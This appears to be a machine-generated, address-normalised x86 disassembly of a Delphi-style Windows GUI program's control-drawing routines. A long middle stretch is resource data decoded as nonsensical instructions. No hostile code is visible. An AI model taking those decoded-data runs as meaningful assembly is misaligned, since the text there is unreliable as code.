call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_43430f
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_433dec
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_433c58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_419034
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_43433c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_434377
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43437e
retn
mov eax [ rw-data ]
call sub_403234
mov eax rw-data
call sub_404008
sub_4365b0
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] al
push cs
push eax
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001b ] al
outsd
outsb
je r-xdata
fsubr [ edx ]
inc esp
add [ esp + ecx * 2 ] dh
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
or [ edx ] eax
add bh bh
and al 0xa0
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
add [ eax ] al
sbb al [ eax ]
push cs
push eax
popad
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop ecx
add [ eax ] al
jmp esp
add [ eax ] al
and [ ebx ] 0x0
or cl [ edi + 0x6e ]
push edi
jb r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
dec [ esi + edx * 4 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
add [ edi ] al
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
outsb
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090026 ] al
inc esp
jb r-xdata
jo r-xdata
adc [ eax ] al
adc [ eax ] al
cdq
add [ eax ] al
dec [ eax ]
sub eax 0x2cd00044
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001c ] al
push 0x6948776f
outsb
je r-xdata
xchg ebp eax
push 0x6948776f
outsb
je r-xdata
dec ebx
jns r-xdata
push 0xc000417a
jpe r-xdata
jo r-xdata
jb r-xdata
jpe r-xdata
push edi
add [ eax ] al
fadd [ ebx ]
je r-xdata
outsb
je r-xdata
sbb al 0x45
add [ eax + eax ] bh
push [ eax + 0x2b ]
inc esp
add [ ecx ] al
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
fiadd [ ebx ]
fadd [ ecx ]
add bh bh
fadd [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add al al
add [ eax ] al
and [ eax ] al
or [ edi + 0x6f ] dl
jb r-xdata
add [ eax ] al
fild [ ebx ]
[ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0024 ] al
outsb
inc esp
jb r-xdata
js r-xdata
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
inc esp
add ah dh
xchg ebp eax
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
loopne r-xdata
jo r-xdata
fiadd [ ebx ]
inc esp
fild [ ebx ]
loopne r-xdata
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0b00
jb r-xdata
jae r-xdata
jpe r-xdata
add [ eax + 0x4f070027 ] al
add [ eax ] al
dec edi
loopne r-xdata
push eax
outsd
jo r-xdata
adc [ eax ] al
0x2cff0000 0x442d
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
dec ebp
outsd
jne r-xdata
fiadd [ ebx ]
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
or ecx [ edi + 0x6e ]
popad
dec ebp
outsd
jbe r-xdata
jmp eax
add bh bh
loopne r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
jns r-xdata
fiadd [ ebx ]
call 0xffffffffe9426860
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07002b ] al
outsb
add al cl
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060028 ] al
push 0xc800417a
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : ecx ] cl
dec edi
jo r-xdata
push ebp
push ebp
jo r-xdata
arpl [ ebx + 0x68 ] bp
loopne r-xdata
inc esp
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x39ffbc96 ] ah
je r-xdata
dec edi
sbb al 0xde
inc ebx
add al ah
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a002a ] al
outsb
dec ebx
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or cl [ edi + 0x6e ]
add [ eax ] al
jmp eax
clc
jns r-xdata
je r-xdata
loopne r-xdata
inc esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0023 ] al
outsb
loopne r-xdata
inc esp
jns r-xdata
outsb
arpl [ eax + 0x65 ] bp
arpl [ ebx + 0x65 ] bp
or [ fs : ebx + 0x62 ] esp
inc ebx
push 0x656b6365
or [ fs : ebx + 0x62 ] ah
loop r-xdata
add [ ebx ] cl
arpl [ edx + 0x55 ] sp
outsb
push ebx
je r-xdata
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
xchg esp eax
add [ edx + ebp * 4 + 0x41 ] ah
add [ esp + ecx * 2 + 0x44 ] dh
add al dh
pushad
inc ebx
add [ eax - 0x77ffbdf2 ] bl
xor al 0x40
add al bl
je r-xdata
add ah bl
push 0x43
jb r-xdata
outsb
inc ebp
js r-xdata
push es
dec edi
popad
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090025 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x50 ] bp
jbe r-xdata
dec edi
add al ch
add [ eax ] al
inc esp
add [ esp + edx * 2 ] cl
inc esp
add [ eax + 0x4000445a ] ah
push 0xa4e80044
xchg edx eax
inc ebx
add [ ebp - 0x5a73ffbd ] al
inc ebx
add [ eax ] ch
cmpsb [ esi ] [ edi ]
inc ebx
add [ esp + 0x43 ] cl
je r-xdata
or [ fs : ebx + 0x74 ] dl
inc ebx
je r-xdata
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002f ] al
outsb
push ebx
je r-xdata
pop es
inc edx
add [ eax + 0x18004034 ] dl
outsd
inc esp
add ah cl
xor [ eax ] eax
call 0xfffffffff043a9fa
push ecx
inc esp
add al dh
sahf
inc esp
add al ah
inc sp
push cs
inc edx
add [ eax - 0x27ffbfcc ] cl
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ecx + ebp * 2 ] dh
inc ebx
add [ eax ] al
adc al 0x2
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
insb
inc ebx
je r-xdata
inc esp
add [ eax - 0x3fffbbd7 ] cl
pop ds
inc esp
add [ ebx + ebp ] dl
inc esp
add [ edx + ebp + 0x2da00044 ] cl
inc esp
add [ esp + ebp + 0x44 ] cl
add [ eax ] dl
lahf
inc ebx
add ah dh
dec esi
inc esp
add [ edx + edx * 4 ] cl
inc esp
add al cl
xchg edx eax
inc esp
add [ ebp + ecx * 4 - 0x6d53ffbc ] cl
add [ eax - 0x6bffbbe0 ] cl
push ebx
inc esp
add [ eax - 0x4fffbbd7 ] ah
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
inc esp
or eax [ edx ]
jl r-xdata
insb
jae r-xdata
inc edi
jb r-xdata
or [ fs : ebx + 0x62 ] ah
jb r-xdata
push 0x43
add [ edx + eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0xffffffffc600436a ]
cmp [ bx + di + 0x43 ] ch
add [ ebx ] al
push cs
push esp
inc ebx
push 0x426b6365
outsd
js r-xdata
add [ eax ] dl
lahf
inc ebx
add ah dh
dec esi
inc esp
add [ edx + edx * 4 ] cl
inc esp
add al cl
xchg edx eax
inc esp
add [ ebp + ecx * 4 - 0x6d53ffbc ] cl
inc esp
add [ esp + edx * 2 ] cl
inc esp
add [ eax + 0x4000445a ] ah
push 0xa4e80044
inc ebx
add [ eax ] ch
inc esp
add [ ebp + 0x43 ] al
add al bl
push 0x68dc0044
inc esp
add [ edi + 0x673c0044 ] dl
inc esp
add ah ch
xchg ebx eax
inc esp
add [ ecx + esi * 2 - 0x5a3fffbc ] al
inc esp
add [ eax ] dh
nop
inc esp
add [ eax - 0x6d ] bl
inc esp
add [ eax - 0x5c ] ah
inc ebx
add [ eax + 0xc0043a4 ] al
movsb [ edi ] [ esi ]
inc ebx
add [ ecx ] cl
push esp
inc ebx
push 0x426b6365
outsd
js r-xdata
inc esp
add [ eax + 0x4c00442d ] ah
sub al 0x44
rcl [ esp + ebp * 2 + 0x43 ] 0x0
pop es
or [ ebx + eax * 2 + 0x68 ] edx
arpl [ gs : ebx + 0x42 ] bp
outsd
js r-xdata
add [ eax ] al
insd
inc ebx
push 0x426b6365
outsd
js r-xdata
add ah bh
push ds
inc esp
add [ eax - 0x5fffbb6c ] al
xchg esp eax
inc esp
add [ eax + 0x44004491 ] al
push ds
inc esp
add [ eax + 0x1e ] cl
inc esp
add [ esi + ecx * 2 + 0x44 ] al
add [ eax + 0x4e ] dh
0x9f200044 0x44
insb
sahf
inc esp
inc edx
add [ eax + 0x7400420e ] bh
mov [ 0xffffffff9a040043 ] eax
inc esp
add [ eax ] ah
lahf
inc esp
add [ esi + ebx * 4 + 0x44 ] ch
outsd
add [ eax ] al
add [ eax ] al
inc eax
add ah cl
imul eax [ ebx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fsubr [ edx + 0x43 ]
inc esp
add [ esi ] cl
imul eax [ ebx ] 0xffffffd8
push 0x43
add [ esi ] dh
add [ eax ] cl
push ebx
je r-xdata
inc ebx
add [ eax ] ch
inc esp
add [ ebp + 0x43 ] al
add al bl
push 0x68dc0044
inc esp
add [ edi + 0x673c0044 ] dl
inc esp
add ah ch
xchg ebx eax
inc esp
add [ ecx + esi * 2 - 0x5a3fffbc ] al
inc esp
add [ eax ] dh
nop
inc esp
add [ eax - 0x6d ] bl
inc esp
add [ eax - 0x5c ] ah
inc ebx
add [ eax + 0xc0043a4 ] al
movsb [ edi ] [ esi ]
inc ebx
add [ esi ] al
add [ 0x6b01000 ] al
mov al 0x11
mov ebp 0xffcaffeb
jo r-xdata
inc esp
add al ch
movsb [ edi ] [ esi ]
rcr ah 0x6a
inc ebx
add [ edi ] al
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
outsd
pushad
jb r-xdata
add [ ebx ] cl
inc ecx
insb
insb
outsd
ja r-xdata
push cs
inc ebx
je r-xdata
pop es
inc edx
add [ eax + 0x18004034 ] dl
outsd
inc esp
add ah cl
xor [ eax ] eax
call 0xfffffffff043ab9e
push ecx
inc esp
add al dh
sahf
inc esp
add al ah
inc sp
add [ edx + ebp * 4 + 0x41 ] ah
add [ esp + ecx * 2 + 0x44 ] dh
add [ eax - 0x6bffbbe0 ] cl
push ebx
inc esp
add [ eax - 0x4fffbbd7 ] ah
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
inc edx
add [ eax + 0x7400420e ] bh
add al bl
outsd
insd
inc ebx
push 0x426b6365
outsd
js r-xdata
xchg ebp eax
inc esp
add [ edx * 4 + 0x44 ] bh
add [ eax - 0x80000000 ] al
adc eax 0x74430500
insb
xor eax [ eax + edi * 2 - 0x2b ]
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
imul ebp [ edi + 0x6e ] r-xdata
enter 0x0 0xfe
int3
popad
jo r-xdata
add [ edi ] al
inc ebx
jns r-xdata
add [ ecx ] ah
add bh bh
or al 0x1f
insb
jae r-xdata
add al ah
mov [ 0x540f0043 ] eax
inc ebx
jne r-xdata
sub [ esi - 0x5bb3ffbd ] ah
inc ebx
imul eax [ ebx ] r-xdata
or al 0x0
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
push ss
add [ edx ] cl
inc esp
add [ eax + 0x441f ] ch
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
sldt [ edi ]
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
mov eax 0x610043dc
add [ eax ] al
dec [ edi + ebx ]
je r-xdata
and [ ecx + 0x41 ] bh
add [ edi ] bl
add bh bh
jo r-xdata
movsb [ edi ] [ esi ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax 0x6c410900
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] dl
inc eax
add [ ecx ] dl
add al [ eax ]
call [ ecx ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al al
pop [ ecx ]
cmp al 0x0
add dh bh
sub al 0x1f
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000c ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
clc
js r-xdata
insb
jae r-xdata
add [ eax ] eax
add [ eax ] al
sbb [ eax ] eax
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
or al 0x22
inc edx
add [ eax ] ch
inc ebx
jne r-xdata
inc ebx
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050013 ] al
outsd
insb
outsd
jb r-xdata
fadd [ ebx ]
mov eax 0xe800442b
sub eax [ eax + eax - 0x4c ]
dec ebx
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070011 ] al
add dh bh
fsubr [ esp + eax * 2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080010 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x6065646f
inc edi
add [ eax ] dl
add al [ eax ]
[ esp + 0x43 ]
add [ eax ] dl
inc eax
add [ ecx + eax - 0x69f30100 ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
dec [ esi + edx * 4 ]
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
[ esp + ebp + 0x2cbc0044 ]
jae r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
inc esp
jb r-xdata
fld [ ebx ]
je r-xdata
mov [ 0xffffffff9a040043 ] eax
inc esp
add [ eax ] ah
lahf
inc esp
add [ esi + ebx * 4 + 0x44 ] ch
add ah bh
push ds
inc esp
add [ eax - 0x5fffbb6c ] al
xchg esp eax
inc esp
add [ eax + 0x44004491 ] al
push ds
inc esp
add [ eax + 0x1e ] cl
inc esp
add [ esi + ecx * 2 + 0x44 ] al
add [ eax + 0x4e ] dh
inc esp
add [ eax - 0x3fffbbd7 ] cl
pop ds
inc esp
add [ ebx + ebp ] dl
inc esp
add [ edx + ebp + 0x2da00044 ] cl
inc esp
add [ esp + ebp + 0x44 ] cl
or eax [ edx ]
mov eax 0x7400420e
add [ eax ] bl
add al [ eax ]
add [ eax - 0x67ffbc97 ] al
push cs
inc edx
add [ eax - 0x27ffbfcc ] cl
imul eax [ ebx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 2 + 0x43 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 2 + 0x43 ] al
add bh bh
lodsb [ esi ]
sub al 0x44
add [ esp + ebp + 0x44 ] bh
add [ eax - 0x80000000 ] al
sbb al [ eax ]
jb r-xdata
pop ss
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x18ff0001 ] ah
outsd
outsb
jae r-xdata
add bh bh
mov [ eax + 0x44 ] ss
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0014 ] al
add [ eax ] cl
inc esp
jb r-xdata
add [ eax ] al
add [ edi ] dl
fadd [ ebx ]
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x46
outsd
outsb
je r-xdata
sbb [ edx ] 0x0
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
sub_43727c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl [ ebx + 0x43 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
jae r-xdata
inc esp
add [ eax - 0x4fffbbd7 ] ah
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
inc edx
add [ eax + 0x3800420e ] bh
cmpsb [ esi ] [ edi ]
inc ebx
add [ edx + ebx * 4 ] al
inc esp
add [ eax ] ah
lahf
inc esp
add [ esi + ebx * 4 + 0x44 ] ch
add ah bh
push ds
inc esp
add [ eax - 0x5fffbb6c ] al
xchg esp eax
inc esp
add [ eax + 0x44004491 ] al
push ds
inc esp
add [ eax + 0x1e ] cl
inc esp
add [ esi + ecx * 2 + 0x44 ] al
add [ eax + 0x4e ] dh
inc esp
add [ eax - 0x3fffbbd7 ] cl
pop ds
inc esp
add [ ebx + ebp ] dl
inc esp
add [ edx + ebp + 0x2da00044 ] cl
inc esp
add [ esp + ebp + 0x44 ] cl
add [ eax ] dl
lahf
inc ebx
add ah dh
dec esi
inc esp
add [ edx + edx * 4 ] cl
inc esp
add al cl
xchg edx eax
inc esp
add [ ebp + ecx * 4 - 0x6d53ffbc ] cl
inc esp
add [ esp + edx * 2 ] cl
inc esp
add [ eax + 0x4000445a ] ah
push 0xa8280044
inc ebx
add [ eax ] ch
inc esp
add [ eax - 0x27ffbc58 ] al
push 0x68dc0044
inc esp
add [ edi + 0x673c0044 ] dl
inc esp
add ah ch
xchg ebx eax
inc esp
add [ ecx + esi * 2 - 0x5a3fffbc ] al
inc esp
add [ eax ] dh
nop
inc esp
add [ eax - 0x6d ] bl
inc esp
add [ eax - 0x63ffbc5a ] bl
cmpsd [ esi ] [ edi ]
inc ebx
add [ eax + eax ] al
adc [ eax - 0x42ee4ffa ] dh
0xacff
add [ esi + 0x14004373 ] ch
add al [ eax ]
add al dh
pushad
inc ebx
add [ eax - 0x77ffbdf2 ] bl
xor al 0x40
add al bl
pop es
inc edx
add [ eax + 0x18004034 ] dl
outsd
inc esp
add ah cl
xor [ eax ] eax
call 0xfffffffff043b2f2
push ecx
inc esp
add al dh
sahf
inc esp
add al ah
inc sp
add [ edx + ebp * 4 + 0x41 ] ah
add [ esp + ecx * 2 + 0x44 ] dh
add [ eax - 0x6bffbbe0 ] cl
push ebx
sub_438894
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44b03c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_442374
mov edx 0x69
mov eax esi
call sub_442398
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_4388f0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44540c
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
call sub_4248d8
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_424834
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
sub_43895c
push ebp
mov ebp esp
mov ecx 0x11
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_438cfe
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x208 ]
mov edx [ ebx + 0x68 ]
mov eax edi
call sub_4248d8
call sub_433abc
call sub_433b9c
test al al
je r-xdata
mov edx r-xdata
mov eax edi
call sub_424834
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x1d ]
push eax
mov edx [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
lea edx [ ebp - 0x50 ]
mov eax ebx
call sub_442bb8
cmp [ ebp - 0x50 ] 0x0
je r-xdata
dec edx
mov ecx [ ebx + 0x48 ]
xor eax eax
call sub_419034
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
adc edx 0x0
push 0x0
lea eax [ ebp - 0x2d ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_419034
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x54 ]
mov eax ebx
call sub_442bb8
mov eax [ ebp - 0x54 ]
call sub_4042c8
push eax
lea edx [ ebp - 0x58 ]
mov eax ebx
call sub_442bb8
mov eax [ ebp - 0x58 ]
call sub_4044c8
push eax
mov eax edi
call sub_4249b8
push eax
call GetTextExtentPoint32A
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
mov ecx [ ebp - 0xc ]
xor edx edx
xor eax eax
call sub_419034
mov eax ebx
mov si 0xffc8
call sub_403430
test al al
jne r-xdata
mov edx 0xff000006
mov eax [ edi + 0x14 ]
call sub_424270
inc [ ebp - 0x1d ]
inc [ ebp - 0x19 ]
mov edx 0xff000014
mov eax [ edi + 0x14 ]
call sub_424270
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_424650
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x1d ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ edi + 0x14 ]
call sub_424270
jmp r-xdata
mov [ ebp - 0x39 ] eax
mov eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x25 ]
push eax
mov eax [ ebp - 0x29 ]
push eax
mov eax [ ebp - 0x2d ]
push eax
mov eax edi
call sub_4249b8
push eax
call ExcludeClipRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x48 ]
sub eax 0x8
sub eax [ ebp - 0x25 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
push 0x0
push 0x8
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438d05
lea eax [ ebp - 0x8c ]
mov edx 0x5
call sub_40402c
lea eax [ ebp - 0x68 ]
mov edx 0x2
call sub_40402c
lea eax [ ebp - 0x60 ]
call sub_404714
lea eax [ ebp - 0x5c ]
mov edx 0x4
call sub_40402c
retn
mov eax ebx
mov si 0xffc8
call sub_403430
test al al
jne r-xdata
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_424650
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_442bb8
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x1c
mov [ ebp - 0xd ] 0x1b
jmp r-xdata
lea edx [ ebp - 0x3d ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x21 ]
sub eax [ ebp - 0x29 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
lea edx [ ebp - 0x7c ]
mov eax ebx
call sub_442bb8
mov edx [ ebp - 0x7c ]
mov eax [ ebx + 0x208 ]
call sub_424818
push eax
mov eax [ ebp - 0x15 ]
pop edx
sub eax edx
sub eax 0x8
xor ecx ecx
xor edx edx
call sub_419034
push edi
lea esi [ ebp - 0x78 ]
lea edi [ ebp - 0x1d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x1d ]
push eax
xor ecx ecx
xor edx edx
mov eax 0x8
call sub_419034
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax ebx
call sub_442bb8
mov edx [ ebp - 0x64 ]
lea eax [ ebp - 0x60 ]
call sub_404860
mov eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
push 0x0
push 0x0
mov eax edi
call sub_4249b8
push eax
call sub_433abc
lea ecx [ ebp - 0x4c ]
pop edx
call sub_433d04
jmp r-xdata
call sub_433abc
lea ecx [ ebp - 0x4c ]
mov dl [ ebp - 0xd ]
call sub_433d68
lea eax [ ebp - 0x3d ]
push eax
push 0x0
mov eax edi
call sub_4249b8
push eax
call sub_433abc
